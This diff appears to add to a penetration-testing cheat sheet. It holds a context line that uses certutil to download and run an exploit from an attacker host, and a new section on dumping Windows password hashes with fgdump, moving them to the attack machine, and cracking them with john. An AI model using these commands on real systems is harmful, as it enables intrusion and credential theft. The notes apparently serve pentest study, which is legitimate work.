@@ -218,3 +218,31 @@ cd C:\Windows\temp
 certutil -urlcache -f http://$IP/Exploit.exe
 ```
 5. Run the exploit
+
+### Extracting Windows Hashes via fgdump.exe
+You can extract password hashes via transferring `fgdump.exe`
+
+1. Copy `fgdump.exe` to current directory: 
+<br>
+<br>
+```powershell
+cp /usr/share/windows-resources/binaries/fgdump.exe  .  
+```
+
+2. Transfer the file to target
+3. Run `fgdump.exe` 
+<br>
+<br>
+```powershell
+fgdump.exe
+```
+
+4. Transfer the `127.0.0.1.pwdump` or `.pwdump` file to the attack machine: 
+5. Crack the `pwdump` file with `john`: 
+```bash
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
+```
+
+
+
+
